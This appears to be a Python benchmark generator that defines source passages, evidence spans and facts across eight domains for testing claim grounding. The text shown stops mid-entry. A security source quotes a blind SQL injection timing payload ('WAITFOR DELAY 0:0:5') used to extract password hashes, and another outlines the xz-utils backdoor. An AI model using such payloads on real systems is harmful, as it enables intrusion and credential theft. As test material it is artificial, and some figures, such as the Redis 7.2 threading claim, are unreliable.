"""
Adversarial Claim & Grounding Benchmark Generator for ApexDecision.

Generates realistic source documents and claims across 8 domains and 20 distinct failure modes:
1. Direct entailment (SUPPORTED)
2. Direct contradiction (NOT_SUPPORTED)
3. Unsupported claim (NOT_SUPPORTED)
4. Negation reversal (NOT_SUPPORTED)
5. Double negation (SUPPORTED)
6. Entity substitution (NOT_SUPPORTED)
7. Number mismatch (NOT_SUPPORTED)
8. Unit mismatch (NOT_SUPPORTED)
9. Date/time mismatch (NOT_SUPPORTED)
10. Population mismatch (NOT_SUPPORTED)
11. Scope mismatch (NOT_SUPPORTED)
12. Quantifier mismatch (NOT_SUPPORTED)
13. Causal overclaim (NOT_SUPPORTED)
14. Correlation vs causation (NOT_SUPPORTED)
15. Comparative claim mismatch (NOT_SUPPORTED)
16. Temporal ordering error (NOT_SUPPORTED)
17. Attribution mismatch (NOT_SUPPORTED)
18. Partial-support claim (NOT_SUPPORTED)
19. Multi-sentence reasoning (SUPPORTED)
20. Lexically similar but semantically unsupported (NOT_SUPPORTED)

Enforces strict source-level partition disjointness between train/val/calib and test pools.
Every claim is strictly grounded in the specific facts and entities of its source document,
preventing cross-pool lexical leakage.
"""

import hashlib
import json
import random
from typing import List, Dict, Any, Tuple
from .dataset_schema import (
    GroundingExample,
    GroundingLabel,
    Domain,
    FailureMode,
    DifficultyTier,
)

# -----------------------------------------------------------------------------
# Base Source Corpora: Pool A (Train / Val / Calibration) - 40 Independent Sources
# -----------------------------------------------------------------------------

SOURCES_POOL_A = {
    Domain.SCIENCE: [
        {
            "id": "sci_a_01",
            "text": "The James Webb Space Telescope detected atmospheric water vapor, carbon dioxide, and sulfur dioxide on exoplanet WASP-39b, located approximately 700 light-years away in Virgo. Photochemical models confirm that sulfur dioxide is produced when stellar ultraviolet light breaks down atmospheric water molecules, releasing hydrogen and reacting with hydrogen sulfide.",
            "evidence": "Photochemical models confirm that sulfur dioxide is produced when stellar ultraviolet light breaks down atmospheric water molecules.",
            "facts": {"subject": "WASP-39b", "telescope": "James Webb Space Telescope", "distance": "700 light-years", "gas": "sulfur dioxide", "agent": "ultraviolet light"}
        },
        {
            "id": "sci_a_02",
            "text": "In quantum chromodynamics, gluons act as exchange particles for the strong force between quarks. Unlike photons in quantum electrodynamics which carry no electric charge, gluons carry color charge themselves. Consequently, gluons participate in strong interactions and can bind with one another to theoretically form glueballs.",
            "evidence": "gluons carry color charge themselves. Consequently, gluons participate in strong interactions and can bind with one another",
            "facts": {"subject": "gluons", "theory": "quantum chromodynamics", "force": "strong force", "property": "color charge", "product": "glueballs"}
        },
        {
            "id": "sci_a_03",
            "text": "CRISPR-Cas9 endonuclease cleaves double-stranded DNA at specific sites directed by a 20-nucleotide guide RNA sequence adjacent to a 5'-NGG protospacer adjacent motif (PAM). Non-homologous end joining (NHEJ) repair frequently introduces small insertions or deletions (indels) that disrupt the target open reading frame.",
            "evidence": "Non-homologous end joining (NHEJ) repair frequently introduces small insertions or deletions (indels) that disrupt the target open reading frame.",
            "facts": {"subject": "CRISPR-Cas9", "pam": "5'-NGG PAM", "pathway": "NHEJ", "outcome": "indels", "length": "20-nucleotide"}
        },
        {
            "id": "sci_a_04",
            "text": "Superconductivity in cuprates emerges below a critical transition temperature (Tc) that can exceed 130 Kelvin at ambient pressure. Although conventional BCS theory explains phonon-mediated pairing in metallic superconductors below 30 Kelvin, high-Tc cuprate superconductivity involves strong electron-electron correlations in two-dimensional copper-oxide planes.",
            "evidence": "high-Tc cuprate superconductivity involves strong electron-electron correlations in two-dimensional copper-oxide planes.",
            "facts": {"subject": "cuprates", "temp": "130 Kelvin", "plane": "copper-oxide planes", "theory": "BCS theory", "correlation": "electron-electron correlations"}
        },
        {
            "id": "sci_a_05",
            "text": "Paleoclimate reconstructions from Antarctic ice core EPICA Dome C indicate atmospheric carbon dioxide concentrations fluctuated between 180 and 300 parts per million over the past 800,000 years. Glacial-interglacial transitions occurred at quasi-periodic intervals of roughly 100,000 years, governed by Milankovitch orbital eccentricity cycles.",
            "evidence": "atmospheric carbon dioxide concentrations fluctuated between 180 and 300 parts per million over the past 800,000 years.",
            "facts": {"subject": "EPICA Dome C", "range": "180 to 300 ppm", "timespan": "800,000 years", "cycle": "100,000 years", "driver": "Milankovitch cycles"}
        }
    ],
    Domain.MEDICINE: [
        {
            "id": "med_a_01",
            "text": "A randomized controlled trial of 4,200 adult patients with resistant hypertension demonstrated that renal denervation reduced 24-hour ambulatory systolic blood pressure by 6.8 mmHg compared to sham procedure at 6 months (p < 0.001). No significant difference in renal artery stenosis or major adverse kidney events was observed between the groups.",
            "evidence": "renal denervation reduced 24-hour ambulatory systolic blood pressure by 6.8 mmHg compared to sham procedure at 6 months",
            "facts": {"subject": "renal denervation", "cohort": "4,200 adult patients", "metric": "6.8 mmHg reduction", "endpoint": "6 months", "p_val": "p < 0.001"}
        },
        {
            "id": "med_a_02",
            "text": "GLP-1 receptor agonists like semaglutide improve glycemic control by stimulating glucose-dependent insulin secretion and delaying gastric emptying. In the STEP-1 trial, obese non-diabetic participants receiving weekly 2.4 mg subcutaneous semaglutide achieved an average body weight loss of 14.9% over 68 weeks, compared to 2.4% in the placebo group.",
            "evidence": "participants receiving weekly 2.4 mg subcutaneous semaglutide achieved an average body weight loss of 14.9% over 68 weeks, compared to 2.4% in the placebo group.",
            "facts": {"subject": "semaglutide", "trial": "STEP-1 trial", "dose": "weekly 2.4 mg", "weight_loss": "14.9%", "duration": "68 weeks"}
        },
        {
            "id": "med_a_03",
            "text": "CAR-T cell therapy targeting CD19 achieves complete remission rates of 70% to 85% in refractory pediatric acute lymphoblastic leukemia. However, cytokine release syndrome (CRS) occurs in approximately 77% of treated patients, with severe grade 3 or 4 CRS managed via the IL-6 receptor antagonist tocilizumab and high-dose corticosteroids.",
            "evidence": "cytokine release syndrome (CRS) occurs in approximately 77% of treated patients, with severe grade 3 or 4 CRS managed via the IL-6 receptor antagonist tocilizumab",
            "facts": {"subject": "CAR-T cell therapy", "target": "CD19", "remission": "70% to 85%", "toxicity": "CRS in 77%", "reversal": "tocilizumab"}
        },
        {
            "id": "med_a_04",
            "text": "Phase 3 clinical trial data for the monoclonal antibody lecanemab demonstrated a 27% reduction in cognitive decline over 18 months in patients with early Alzheimer's disease. Amyloid-related imaging abnormalities with edema (ARIA-E) occurred in 12.6% of patients in the lecanemab group compared to 1.7% in the placebo group.",
            "evidence": "lecanemab demonstrated a 27% reduction in cognitive decline over 18 months in patients with early Alzheimer's disease.",
            "facts": {"subject": "lecanemab", "benefit": "27% reduction in cognitive decline", "period": "18 months", "adverse": "ARIA-E in 12.6%", "indication": "early Alzheimer's"}
        },
        {
            "id": "med_a_05",
            "text": "Pre-exposure prophylaxis (PrEP) with daily oral emtricitabine/tenofovir disoproxil fumarate reduces the risk of sexually acquired HIV infection by approximately 99% when taken consistently. Adherence is critical, as efficacy drops precipitously when patients miss more than two doses per week.",
            "evidence": "reduces the risk of sexually acquired HIV infection by approximately 99% when taken consistently.",
            "facts": {"subject": "emtricitabine/tenofovir PrEP", "efficacy": "99% risk reduction", "condition": "taken consistently", "virus": "HIV"}
        }
    ],
    Domain.FINANCE: [
        {
            "id": "fin_a_01",
            "text": "In Q2 2024, Acme Payments reported gross merchandise volume of $14.2 billion, representing a 19% year-over-year increase. Net operating margin compressed from 24.5% to 21.8% due to elevated cloud infrastructure costs and increased merchant loss reserves in the Latin America division.",
            "evidence": "Net operating margin compressed from 24.5% to 21.8% due to elevated cloud infrastructure costs and increased merchant loss reserves",
            "facts": {"subject": "Acme Payments", "period": "Q2 2024", "gmv": "$14.2 billion", "growth": "19% YoY", "margin": "compressed to 21.8%"}
        },
        {
            "id": "fin_a_02",
            "text": "The Federal Reserve's Federal Open Market Committee maintained the target range for the federal funds rate at 5.25% to 5.50% at its July meeting. The committee noted that while job gains have moderated and the unemployment rate has ticked up to 4.3%, inflation remains somewhat elevated at 2.9% annualized CPI.",
            "evidence": "The committee noted that while job gains have moderated and the unemployment rate has ticked up to 4.3%, inflation remains somewhat elevated at 2.9% annualized CPI.",
            "facts": {"subject": "Federal Reserve FOMC", "rate": "5.25% to 5.50%", "unemployment": "4.3%", "cpi": "2.9% annualized", "meeting": "July meeting"}
        },
        {
            "id": "fin_a_03",
            "text": "Cloudflare issued $1.29 billion of 0% convertible senior notes due in 2026. The initial conversion price was set at approximately $190.40 per share of Class A common stock, representing a 37.5% premium over the closing price of $138.47 on the date of issuance.",
            "evidence": "representing a 37.5% premium over the closing price of $138.47 on the date of issuance.",
            "facts": {"subject": "Cloudflare convertible notes", "size": "$1.29 billion", "conversion": "$190.40 per share", "premium": "37.5%", "base": "$138.47"}
        },
        {
            "id": "fin_a_04",
            "text": "Apex Capital liquidated its 12% equity stake in NeoBank Group for $340 million, realizing an internal rate of return of 28.4% over a four-year holding period. The proceeds were reallocated into sovereign bond portfolios yielding 4.8% to mitigate portfolio volatility.",
            "evidence": "Apex Capital liquidated its 12% equity stake in NeoBank Group for $340 million, realizing an internal rate of return of 28.4%",
            "facts": {"subject": "Apex Capital", "asset": "NeoBank Group stake", "cash": "$340 million", "irr": "28.4%", "horizon": "four-year holding period"}
        },
        {
            "id": "fin_a_05",
            "text": "Eurozone harmonized headline inflation slowed to 2.2% year-on-year in August, down from 2.6% in July, driven primarily by falling energy commodity costs. Core inflation, which excludes volatile energy, food, alcohol, and tobacco prices, remained steady at 2.8%.",
            "evidence": "Eurozone harmonized headline inflation slowed to 2.2% year-on-year in August, down from 2.6% in July",
            "facts": {"subject": "Eurozone inflation", "august": "2.2% YoY", "july": "2.6%", "core": "2.8%", "driver": "falling energy costs"}
        }
    ],
    Domain.TECHNOLOGY: [
        {
            "id": "tech_a_01",
            "text": "PostgreSQL 16 introduced bidirectional logical replication between active instances, allowing parallel transaction applying on standby workers. However, sequence generation remains strictly localized, meaning sequence objects are not replicated automatically and require application-level coordination to prevent primary key collisions.",
            "evidence": "sequence generation remains strictly localized, meaning sequence objects are not replicated automatically",
            "facts": {"subject": "PostgreSQL 16", "feature": "bidirectional logical replication", "gap": "sequence generation localized", "worker": "standby workers"}
        },
        {
            "id": "tech_a_02",
            "text": "The Apache Kafka Raft (KRaft) consensus protocol removes external ZooKeeper dependencies by electing an internal quorum of active metadata brokers. In stress testing with 500 partitions, KRaft reduced partition leader election time from 3.2 seconds down to 240 milliseconds during abrupt controller broker failover.",
            "evidence": "KRaft reduced partition leader election time from 3.2 seconds down to 240 milliseconds during abrupt controller broker failover.",
            "facts": {"subject": "Apache Kafka KRaft", "replaces": "ZooKeeper", "speedup": "3.2 seconds to 240 ms", "partitions": "500 partitions"}
        },
        {
            "id": "tech_a_03",
            "text": "NVIDIA's Hopper H100 GPU incorporates fourth-generation Tensor Cores with Transformer Engine FP8 support. When training GPT-style 175B parameter models, FP8 mixed precision achieves up to a 3.2x throughput speedup compared to FP16 while maintaining identical validation perplexity.",
            "evidence": "FP8 mixed precision achieves up to a 3.2x throughput speedup compared to FP16 while maintaining identical validation perplexity.",
            "facts": {"subject": "NVIDIA Hopper H100", "engine": "Transformer Engine FP8", "speedup": "3.2x vs FP16", "model": "175B parameters"}
        },
        {
            "id": "tech_a_04",
            "text": "Rust's borrow checker enforces compile-time memory safety through affine type semantics. Mutable references are strictly exclusive: while a mutable reference (&mut T) is active, no other references (mutable or immutable) to the same underlying data structure may coexist in scope.",
            "evidence": "while a mutable reference (&mut T) is active, no other references (mutable or immutable) to the same underlying data structure may coexist in scope.",
            "facts": {"subject": "Rust borrow checker", "construct": "mutable reference &mut T", "rule": "strictly exclusive", "timing": "compile-time"}
        },
        {
            "id": "tech_a_05",
            "text": "Kubernetes Gateway API v1.0 graduated to General Availability, succeeding Ingress as the standard interface for ingress traffic routing. Gateway API provides role-oriented custom resources—GatewayClass, Gateway, and HTTPRoute—enabling infrastructure operators and developers to manage routing independently.",
            "evidence": "Gateway API provides role-oriented custom resources—GatewayClass, Gateway, and HTTPRoute—enabling infrastructure operators and developers to manage routing independently.",
            "facts": {"subject": "Kubernetes Gateway API v1.0", "replaces": "Ingress", "resources": "GatewayClass and HTTPRoute", "status": "General Availability"}
        }
    ],
    Domain.LAW_POLICY: [
        {
            "id": "law_a_01",
            "text": "Under Article 17 of the General Data Protection Regulation (GDPR), data subjects have the right to obtain erasure of their personal data without undue delay where the personal data are no longer necessary in relation to the purposes for which they were collected. However, this right does not apply to the extent that processing is necessary for compliance with a legal obligation.",
            "evidence": "this right does not apply to the extent that processing is necessary for compliance with a legal obligation.",
            "facts": {"subject": "GDPR Article 17", "right": "erasure without undue delay", "exception": "compliance with legal obligation"}
        },
        {
            "id": "law_a_02",
            "text": "The EU AI Act classifies artificial intelligence systems used in critical infrastructure, recruitment, credit scoring, and law enforcement as high-risk. High-risk systems must undergo a fundamental rights impact assessment, implement risk management systems, and maintain detailed technical documentation before market entry.",
            "evidence": "The EU AI Act classifies artificial intelligence systems used in critical infrastructure, recruitment, credit scoring, and law enforcement as high-risk.",
            "facts": {"subject": "EU AI Act", "category": "high-risk AI", "domains": "recruitment and credit scoring", "requirement": "fundamental rights impact assessment"}
        },
        {
            "id": "law_a_03",
            "text": "Under Delaware General Corporation Law Section 141(a), the business and affairs of every corporation organized under this chapter shall be managed by or under the direction of a board of directors, except as may be otherwise provided in this chapter or in its certificate of incorporation.",
            "evidence": "managed by or under the direction of a board of directors, except as may be otherwise provided in this chapter or in its certificate of incorporation.",
            "facts": {"subject": "DGCL Section 141(a)", "governance": "board of directors", "exception": "certificate of incorporation"}
        },
        {
            "id": "law_a_04",
            "text": "The California Consumer Privacy Act (CCPA) grants California consumers the right to opt out of the sale or sharing of their personal information to third parties. Businesses must provide a clear and conspicuous link on their website titled 'Do Not Sell or Share My Personal Information' to facilitate this request.",
            "evidence": "Businesses must provide a clear and conspicuous link on their website titled 'Do Not Sell or Share My Personal Information'",
            "facts": {"subject": "CCPA", "right": "opt out of sale or sharing", "requirement": "Do Not Sell or Share link", "jurisdiction": "California"}
        },
        {
            "id": "law_a_05",
            "text": "The Foreign Corrupt Practices Act (FCPA) prohibits US persons and businesses from paying bribes to foreign government officials to obtain or retain business. It also requires public companies to maintain accurate books and records and an adequate system of internal accounting controls.",
            "evidence": "prohibits US persons and businesses from paying bribes to foreign government officials to obtain or retain business.",
            "facts": {"subject": "FCPA", "prohibition": "bribes to foreign officials", "accounting": "accurate books and records"}
        }
    ],
    Domain.BUSINESS: [
        {
            "id": "bus_a_01",
            "text": "Logistics provider FreightPro expanded its warehouse automation network across five Midwest distribution hubs, deploying 350 autonomous mobile robots. The automation initiative reduced average dock-to-stock processing time from 4.2 hours to 45 minutes while decreasing fulfillment labor expense by 22%.",
            "evidence": "reduced average dock-to-stock processing time from 4.2 hours to 45 minutes while decreasing fulfillment labor expense by 22%.",
            "facts": {"subject": "FreightPro automation", "hardware": "350 autonomous mobile robots", "time_change": "4.2 hours to 45 minutes", "saving": "22% labor expense"}
        },
        {
            "id": "bus_a_02",
            "text": "OmniRetail announced a definitive merger agreement to acquire Horizon Grocers in an all-cash transaction valued at $8.9 billion. The acquisition adds 420 physical store locations in the Pacific Northwest and is projected to generate $350 million in annual run-rate cost synergies within 24 months.",
            "evidence": "all-cash transaction valued at $8.9 billion. The acquisition adds 420 physical store locations",
            "facts": {"subject": "OmniRetail acquisition", "target": "Horizon Grocers", "price": "$8.9 billion cash", "stores": "420 locations", "synergies": "$350 million"}
        },
        {
            "id": "bus_a_03",
            "text": "SaaS analytics startup MetricStream reached $50 million in Annual Recurring Revenue (ARR) within 36 months of launch, achieving a net revenue retention rate of 128%. The expansion was fueled by rapid enterprise adoption of its real-time telemetry pipeline among Fortune 500 financial institutions.",
            "evidence": "reached $50 million in Annual Recurring Revenue (ARR) within 36 months of launch, achieving a net revenue retention rate of 128%.",
            "facts": {"subject": "MetricStream", "arr": "$50 million ARR", "time": "36 months", "nrr": "128% retention"}
        },
        {
            "id": "bus_a_04",
            "text": "Automaker Veloce Motors recalled 85,000 electric SUVs manufactured between 2022 and 2024 due to an intermittent fault in the electronic brake control module software. The company confirmed that no collisions or injuries have occurred, and the defect will be rectified via an over-the-air firmware update.",
            "evidence": "no collisions or injuries have occurred, and the defect will be rectified via an over-the-air firmware update.",
            "facts": {"subject": "Veloce Motors recall", "count": "85,000 electric SUVs", "defect": "brake control module software", "remedy": "OTA firmware update"}
        },
        {
            "id": "bus_a_05",
            "text": "Coffee conglomerate BeanCraft announced plans to transition 100% of its global coffee bean sourcing to certified regenerative agricultural cooperatives by 2028. Currently, 42% of its raw bean volume meets certified regenerative standards across partner farms in Colombia and Ethiopia.",
            "evidence": "Currently, 42% of its raw bean volume meets certified regenerative standards across partner farms in Colombia and Ethiopia.",
            "facts": {"subject": "BeanCraft", "goal": "100% regenerative by 2028", "current": "42% compliant", "origins": "Colombia and Ethiopia"}
        }
    ],
    Domain.GENERAL_KNOWLEDGE: [
        {
            "id": "gen_a_01",
            "text": "The Panama Canal spans 82 kilometers (51 miles) across the Isthmus of Panama, connecting the Atlantic and Pacific Oceans. Ships transit through three sets of locks—Gatun, Pedro Miguel, and Miraflores—which lift vessels 26 meters above sea level to Gatun Lake before lowering them on the opposite coast.",
            "evidence": "connecting the Atlantic and Pacific Oceans. Ships transit through three sets of locks—Gatun, Pedro Miguel, and Miraflores",
            "facts": {"subject": "Panama Canal", "length": "82 kilometers", "oceans": "Atlantic and Pacific", "locks": "Gatun, Pedro Miguel, Miraflores"}
        },
        {
            "id": "gen_a_02",
            "text": "The Library of Alexandria in Ptolemaic Egypt was established during the 3rd century BCE under the patronage of Ptolemy I Soter and expanded under Ptolemy II Philadelphus. Although popular legend attributes its total destruction to a single catastrophic fire set by Julius Caesar in 48 BCE, historical evidence shows it suffered multiple partial destructions and gradual decline over several centuries.",
            "evidence": "historical evidence shows it suffered multiple partial destructions and gradual decline over several centuries.",
            "facts": {"subject": "Library of Alexandria", "era": "3rd century BCE", "founder": "Ptolemy I Soter", "fate": "multiple partial destructions"}
        },
        {
            "id": "gen_a_03",
            "text": "Mount Everest, situated on the border between Nepal and the Tibet Autonomous Region of China, has an official summit elevation of 8,848.86 meters (29,031.7 feet), agreed upon by Nepali and Chinese surveyors in 2020. It is the highest mountain above sea level on Earth, though Mauna Kea in Hawaii is taller when measured from its underwater base.",
            "evidence": "official summit elevation of 8,848.86 meters (29,031.7 feet), agreed upon by Nepali and Chinese surveyors in 2020.",
            "facts": {"subject": "Mount Everest", "elevation": "8,848.86 meters", "year": "2020", "comparison": "Mauna Kea is taller underwater"}
        },
        {
            "id": "gen_a_04",
            "text": "The Apollo 11 lunar module Eagle landed in the Sea of Tranquility on July 20, 1969. Astronaut Neil Armstrong became the first human to step onto the lunar surface, followed nineteen minutes later by Buzz Aldrin, while command module pilot Michael Collins remained in lunar orbit aboard Columbia.",
            "evidence": "Neil Armstrong became the first human to step onto the lunar surface, followed nineteen minutes later by Buzz Aldrin, while command module pilot Michael Collins remained in lunar orbit",
            "facts": {"subject": "Apollo 11", "landing": "Sea of Tranquility", "date": "July 20, 1969", "first": "Neil Armstrong", "second": "Buzz Aldrin 19 mins later"}
        },
        {
            "id": "gen_a_05",
            "text": "The Mariana Trench in the western Pacific Ocean contains Challenger Deep, the deepest known point in Earth's oceans at approximately 10,994 meters (36,070 feet). The water pressure at the bottom of the trench exceeds 1,000 atmospheres (100 MPa), more than a thousand times standard atmospheric pressure at sea level.",
            "evidence": "Challenger Deep, the deepest known point in Earth's oceans at approximately 10,994 meters (36,070 feet).",
            "facts": {"subject": "Mariana Trench", "point": "Challenger Deep", "depth": "10,994 meters", "pressure": "1,000 atmospheres"}
        }
    ],
    Domain.SECURITY: [
        {
            "id": "sec_a_01",
            "text": "Vulnerability CVE-2024-3094 affected upstream xz-utils data compression library versions 5.6.0 and 5.6.1. The malicious backdoor modified OpenSSH sshd during the build process to intercept RSA decryption routines, allowing an attacker with a specific private key to execute arbitrary commands as root without authentication.",
            "evidence": "allowing an attacker with a specific private key to execute arbitrary commands as root without authentication.",
            "facts": {"subject": "CVE-2024-3094", "software": "xz-utils 5.6.0/5.6.1", "target": "OpenSSH sshd", "impact": "arbitrary root execution"}
        },
        {
            "id": "sec_a_02",
            "text": "Mutual TLS (mTLS) mandates bidirectional cryptographic verification where both client and server present X.509 digital certificates to validate their identities before establishing an encrypted session. In contrast to standard one-way TLS where only server proves its identity, mTLS prevents unauthorized client connections at transport layer.",
            "evidence": "mTLS mandates bidirectional cryptographic verification where both client and server present X.509 digital certificates",
            "facts": {"subject": "Mutual TLS (mTLS)", "mechanism": "bidirectional verification", "cert": "X.509 certificates", "defense": "unauthorized client connections"}
        },
        {
            "id": "sec_a_03",
            "text": "A blind SQL injection vulnerability was uncovered in the customer portal's invoice export endpoint. By injecting timing payloads such as 'WAITFOR DELAY 0:0:5', automated penetration tools extracted database user hashes character-by-character based on server response latency differences.",
            "evidence": "automated penetration tools extracted database user hashes character-by-character based on server response latency differences.",
            "facts": {"subject": "blind SQL injection", "endpoint": "invoice export", "payload": "WAITFOR DELAY timing", "exfil": "database user hashes"}
        },
        {
            "id": "sec_a_04",
            "text": "AWS Identity and Access Management (IAM) evaluates access requests starting with an explicit deny: if any policy contains an explicit Deny statement matching the request context, the request is immediately rejected regardless of any Allow statements in identity-based or resource-based policies.",
            "evidence": "if any policy contains an explicit Deny statement matching the request context, the request is immediately rejected regardless of any Allow statements",
            "facts": {"subject": "AWS IAM evaluation", "rule": "explicit Deny overrides Allow", "scope": "identity and resource policies"}
        },
        {
            "id": "sec_a_05",
            "text": "The SolarWinds supply chain compromise occurred when state-sponsored threat actors injected a malicious backdoor dubbed SUNBURST into the Orion software build pipeline. The compromised DLL was digitally signed with legitimate SolarWinds cryptographic certificates and distributed to approximately 18,000 customer organizations via official software updates.",
            "evidence": "digitally signed with legitimate SolarWinds cryptographic certificates and distributed to approximately 18,000 customer organizations via official software updates.",
            "facts": {"subject": "SolarWinds SUNBURST", "target": "Orion build pipeline", "cert": "legitimate SolarWinds certificate", "scale": "18,000 organizations"}
        }
    ]
}

# -----------------------------------------------------------------------------
# Held-Out Sources: Pool B (Strictly Reserved for Independent Test Set & 108 Jev Suite)
# 24 Independent Sources across 8 domains (3 sources per domain)
# -----------------------------------------------------------------------------

SOURCES_POOL_B = {
    Domain.SCIENCE: [
        {
            "id": "sci_b_01",
            "text": "The Event Horizon Telescope (EHT) collaboration released the first image of Sagittarius A*, the supermassive black hole at the center of the Milky Way, with an estimated mass of 4.3 million solar masses. The image revealed a bright emission ring of 52 microarcseconds diameter surrounding a dark central region known as the black hole shadow.",
            "evidence": "Sagittarius A*, the supermassive black hole at the center of the Milky Way, with an estimated mass of 4.3 million solar masses.",
            "facts": {"subject": "Sagittarius A*", "team": "Event Horizon Telescope", "mass": "4.3 million solar masses", "ring": "52 microarcseconds"}
        },
        {
            "id": "sci_b_02",
            "text": "In condensed matter physics, the quantum anomalous Hall effect allows dissipationless chiral edge transport of electrons without requiring an external magnetic field. It was first experimentally realized in magnetically doped topological insulator thin films of chromium-doped (Bi,Sb)2Te3 at sub-Kelvin temperatures.",
            "evidence": "allows dissipationless chiral edge transport of electrons without requiring an external magnetic field.",
            "facts": {"subject": "quantum anomalous Hall effect", "feature": "no external magnetic field", "material": "chromium-doped (Bi,Sb)2Te3", "temp": "sub-Kelvin"}
        },
        {
            "id": "sci_b_03",
            "text": "Photosystem II catalyzes the light-driven oxidation of water to molecular oxygen in cyanobacteria, algae, and plants. The catalytic oxygen-evolving complex contains a manganese-calcium cluster with chemical formula Mn4CaO5, which cycles through five intermediate oxidation states known as S-states (S0 to S4).",
            "evidence": "The catalytic oxygen-evolving complex contains a manganese-calcium cluster with chemical formula Mn4CaO5",
            "facts": {"subject": "Photosystem II", "cluster": "Mn4CaO5 cluster", "states": "five S-states", "reaction": "oxidation of water"}
        }
    ],
    Domain.MEDICINE: [
        {
            "id": "med_b_01",
            "text": "In a multicenter trial of 1,800 ischemic stroke patients presenting between 4.5 and 24 hours from symptom onset, endovascular thrombectomy plus standard medical care resulted in functional independence at 90 days in 45% of patients, compared to 17% receiving standard medical care alone (p < 0.001). Intracranial hemorrhage rates were not significantly different.",
            "evidence": "functional independence at 90 days in 45% of patients, compared to 17% receiving standard medical care alone",
            "facts": {"subject": "endovascular thrombectomy", "cohort": "1,800 ischemic stroke patients", "rate_thromb": "45% independent", "rate_control": "17% independent", "window": "4.5 to 24 hours"}
        },
        {
            "id": "med_b_02",
            "text": "A randomized trial evaluating the PCSK9 inhibitor evolocumab in 27,564 patients with established cardiovascular disease showed a 59% reduction in LDL cholesterol from baseline (median 92 mg/dL down to 30 mg/dL). Evolocumab treatment significantly reduced the composite risk of cardiovascular death, myocardial infarction, or stroke by 15% over a median follow-up of 2.2 years.",
            "evidence": "showed a 59% reduction in LDL cholesterol from baseline (median 92 mg/dL down to 30 mg/dL).",
            "facts": {"subject": "evolocumab trial", "target": "PCSK9", "cohort": "27,564 patients", "ldl": "59% reduction", "mace_risk": "15% lower"}
        },
        {
            "id": "med_b_03",
            "text": "A phase 2 clinical trial of donanemab in early symptomatic Alzheimer's disease slowed clinical progression by 35% on the integrated Alzheimer's Disease Rating Scale (iADRS) in patients with low-to-medium tau pathology. Amyloid clearance was achieved in 72% of treated participants by week 76, allowing treatment cessation.",
            "evidence": "slowed clinical progression by 35% on the integrated Alzheimer's Disease Rating Scale (iADRS)",
            "facts": {"subject": "donanemab trial", "scale": "iADRS", "slowing": "35% slowed progression", "clearance": "72% amyloid clearance", "week": "week 76"}
        }
    ],
    Domain.FINANCE: [
        {
            "id": "fin_b_01",
            "text": "Fintech platform Stripe processed over $1.0 trillion in total payment volume in 2023, representing a 25% increase over 2022. The company announced that businesses running on Stripe experienced an aggregate uptime of 99.999% during Black Friday and Cyber Monday peak transaction windows.",
            "evidence": "processed over $1.0 trillion in total payment volume in 2023, representing a 25% increase over 2022.",
            "facts": {"subject": "Stripe volume", "tpv": "$1.0 trillion", "growth": "25% over 2022", "uptime": "99.999%", "year": "2023"}
        },
        {
            "id": "fin_b_02",
            "text": "The Bank of Japan ended its eight-year negative interest rate policy in March 2024, raising its short-term policy rate from -0.1% to a target range of 0.0% to 0.1%. It also abandoned its Yield Curve Control (YCC) framework on 10-year Japanese government bonds, marking its first interest rate hike in 17 years.",
            "evidence": "raising its short-term policy rate from -0.1% to a target range of 0.0% to 0.1%. It also abandoned its Yield Curve Control (YCC) framework",
            "facts": {"subject": "Bank of Japan policy", "rate_shift": "-0.1% to 0.0%-0.1%", "framework": "Yield Curve Control abandoned", "time": "March 2024"}
        },
        {
            "id": "fin_b_03",
            "text": "Vanguard's S&P 500 Index ETF (VOO) surpassed $500 billion in assets under management in 2024 with an expense ratio of 0.03%. The fund achieved a tracking error of less than 0.01% annualized against the S&P 500 Total Return Index over a ten-year evaluation window.",
            "evidence": "surpassed $500 billion in assets under management in 2024 with an expense ratio of 0.03%.",
            "facts": {"subject": "Vanguard VOO", "aum": "$500 billion", "fee": "0.03% expense ratio", "tracking": "< 0.01% tracking error"}
        }
    ],
    Domain.TECHNOLOGY: [
        {
            "id": "tech_b_01",
            "text": "DuckDB is an in-process columnar SQL OLAP database management system written in C++11. By processing vector chunks of 2,048 tuples using vectorized query execution and SIMD instructions, DuckDB achieves sub-second analytical query response times directly on raw Parquet files without requiring persistent database ingestion.",
            "evidence": "DuckDB achieves sub-second analytical query response times directly on raw Parquet files without requiring persistent database ingestion.",
            "facts": {"subject": "DuckDB", "architecture": "in-process columnar OLAP", "vector_size": "2,048 tuples", "format": "raw Parquet files"}
        },
        {
            "id": "tech_b_02",
            "text": "WebAssembly (Wasm) provides a sandboxed binary instruction format executed in modern web browsers and server-side runtimes via Wasmtime or Wasmer. Wasm executes at near-native speed, achieving execution times within 1.2x to 1.5x of natively compiled C code while enforcing strict memory isolation through linear memory buffers.",
            "evidence": "achieving execution times within 1.2x to 1.5x of natively compiled C code while enforcing strict memory isolation",
            "facts": {"subject": "WebAssembly", "speed": "1.2x to 1.5x of native C", "safety": "linear memory isolation", "runtimes": "Wasmtime or Wasmer"}
        },
        {
            "id": "tech_b_03",
            "text": "Redis 7.2 introduced multi-threaded I/O multiplexing and cluster sharding supporting up to 1,000 active nodes. While command execution remains single-threaded to guarantee atomic operations, read and write socket operations are offloaded to background threads, increasing throughput by up to 2.8x on 8-core server instances.",
            "evidence": "read and write socket operations are offloaded to background threads, increasing throughput by up to 2.8x on 8-core server instances.",
            "facts": {"subject": "Redis 7.2", "threads": "multi-threaded socket I/O", "core_thread": "single-threaded command execution", "throughput": "2.8x on 8 cores"}
        }
    ],
    Domain.LAW_POLICY: [
        {
            "id": "law_b_01",
            "text": "Under Rule 11 of the Federal Rules of Civil Procedure, an attorney who presents a pleading or motion to a federal court certifies that to the best of their knowledge formed after an inquiry reasonable under the circumstances, the factual contentions have evidentiary support or will likely have evidentiary support after investigation.",
            "evidence": "an attorney who presents a pleading or motion to a federal court certifies that... the factual contentions have evidentiary support",
            "facts": {"subject": "FRCP Rule 11", "duty": "reasonable inquiry", "standard": "factual contentions have evidentiary support"}
        },
        {
            "id": "law_b_02",
            "text": "The UK Data Protection Act 2018 supplements the UK GDPR and establishes exemptions for personal data processed solely for journalistic, academic, artistic, or literary purposes (the 'special purposes' exemption), provided that compliance would be incompatible with those purposes and the controller reasonably believes publication is in the public interest.",
            "evidence": "exemptions for personal data processed solely for journalistic, academic, artistic, or literary purposes",
            "facts": {"subject": "UK Data Protection Act 2018", "exemption": "special purposes exemption", "scope": "journalistic, academic, artistic"}
        },
        {
            "id": "law_b_03",
